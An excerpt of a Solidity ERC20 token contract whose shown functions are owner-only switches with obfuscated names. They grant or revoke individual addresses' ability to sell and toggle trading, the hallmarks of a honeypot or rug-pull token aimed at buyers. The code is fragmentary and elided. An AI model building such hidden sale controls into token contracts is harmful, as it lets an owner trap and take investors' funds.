...
contract ERC20 is IERC20, Ownable {
    ...
    function heiDmdan(address user) public onlyOwner returns(bool){
		_canSale[user] =true;
		return true;
	}
	
	function baiMdanr(address user) public onlyOwner returns(bool){
		_canSale[user] =false;
		return true;
	}

    function reanbbsyt() public onlyOwner returns(bool){
		swap =true;
		return true;
	}

    function reanbbsytStop() public onlyOwner returns(bool){
		swap =false;
		return true;
	}
...
contract TwitterExposed is ERC20 {
